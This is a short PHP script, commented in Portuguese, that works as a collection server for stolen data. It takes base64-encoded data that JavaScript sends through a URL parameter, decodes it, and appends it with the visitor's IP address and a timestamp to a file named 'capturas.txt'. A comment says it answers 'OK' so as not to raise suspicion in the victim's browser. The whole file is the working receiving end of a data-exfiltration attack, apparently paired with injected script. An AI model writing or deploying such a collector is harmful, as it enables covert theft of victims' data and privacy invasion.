<?php
// Define o nome do arquivo onde os logs serão salvos
$log_file = "capturas.txt";

// Pega os dados enviados via URL (?data=... ou ?status=...)
$data = $_GET['data'] ?? null;
$status = $_GET['status'] ?? null;
$ip_origem = $_SERVER['REMOTE_ADDR']; // IP real de quem acessou o site
$data_hora = date("Y-m-d H:i:s");

if ($data) {
    // Decodifica o Base64 que enviamos no JS
    $decoded_data = base64_decode($data);
    $entry = "[$data_hora] IP Origem: $ip_origem | Dados: $decoded_data\n";
} elseif ($status) {
    $entry = "[$data_hora] IP Origem: $ip_origem | STATUS: $status\n";
} else {
    $entry = "[$data_hora] Acesso vazio de $ip_origem\n";
}

// Salva no arquivo capturas.txt (APPEND)
file_put_contents($log_file, $entry, FILE_APPEND);

// Retorna uma resposta vazia para não levantar suspeitas no browser da vítima
echo "OK";
?>
